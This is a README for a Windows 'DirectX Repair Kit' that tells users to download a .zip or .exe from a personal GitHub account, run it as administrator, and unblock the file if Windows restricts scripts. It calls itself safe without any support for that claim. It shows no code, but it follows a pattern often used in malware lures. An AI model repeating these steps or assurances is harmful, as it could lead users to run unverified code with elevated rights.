# 🛠️ DirectX-Repair-Kit-PowerShell - Fix your game graphics errors fast

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)

This tool fixes missing file errors that stop games from starting on Windows 10 and Windows 11. Many games require specific DirectX components to function. When these files go missing or become corrupt, the system displays error messages like "d3dx9_43.dll is missing" or "xinput1_3.dll not found." 

This repair kit automates the process of finding and installing the correct DirectX files. You do not need technical skills to use this tool. It runs a script in the background to detect your system needs and install the necessary files.

## 📋 System Requirements

The repair kit runs on the following versions of Windows:

* Windows 10 (Home, Pro, Enterprise)
* Windows 11 (Home, Pro)

You must have administrative rights on your computer to run the repair process. The tool installs files into the system folders, which requires permission. Ensure your computer connects to the internet before you start. The tool downloads small component files from trusted sources during the installation.

## 📥 Getting the Tool

Follow these steps to obtain the files:

1. Visit the following link to download the software: [https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)
2. Locate the latest release version on that page.
3. Click the file ending in .zip or .exe to start the download.
4. Save the file to your desktop for easy access.

## 🚀 Running the Repair

After you download the file, follow these steps to fix your error:

1. Right-click the downloaded file.
2. Select "Extract All" if you downloaded a zip file.
3. Right-click the PowerShell script or executable file inside the folder.
4. Select "Run as administrator."
5. A blue window appears on your screen. This is the PowerShell console.
6. The window shows the progress of the fix. It checks for missing files.
7. It replaces missing or broken DirectX 9, 10, and 11 files automatically.
8. Wait for a message that says "Repair Complete" or "Tasks Finished."
9. Close the window and restart your computer.

Restarting builds the new file paths into the registry. After the restart, launch your game. The error should no longer appear.

## ❓ Frequently Asked Questions

### What does the tool change?
The script only adds missing DirectX component files. It does not change your desktop settings, remove personal files, or alter your hardware drivers. 

### Why do I need to run this as an administrator?
Windows protects the folders where DirectX files live. Only an administrator can add or change files in these protected locations. 

### Does this tool work for every game error?
It fixes errors related to d3dx9, d3dx10, d3dx11, and xinput. These cover the vast majority of game startup errors. If your game still does not start, the issue might be your graphics card driver. Update your graphics card driver through the manufacturer website if the game errors persist.

### Is this tool safe?
This tool uses standard Windows PowerShell functions. It only interacts with DirectX files. It keeps your computer safe because it only restores files necessary for graphics processing.

## 🔍 Troubleshooting Issues

If the window closes immediately, ensure you clicked "Run as administrator." If you receive a message about scripts being disabled, check your Windows security settings. Windows sometimes marks downloaded scripts as restricted. Right-click the file, choose Properties, and check the "Unblock" box at the bottom of the window if it appears. Click Apply and then try running the tool again.

If you see a "File not found" error during the process, check your internet connection. The tool needs to pull the correct files from the repository database depending on your specific version of Windows.

## 📑 Technical Details

The tool addresses the following common missing files:
* d3dx9_24.dll through d3dx9_43.dll
* d3dx10_33.dll through d3dx10_43.dll
* d3dx11_42.dll and d3dx11_43.dll
* xinput1_1.dll through xinput1_4.dll

The scripts verify the file architecture of your system (x64 or x86) to ensure the repair fits your specific PC hardware. This prevents version mismatch errors that cause system instability. The tool uses standard Microsoft endpoints for file verification.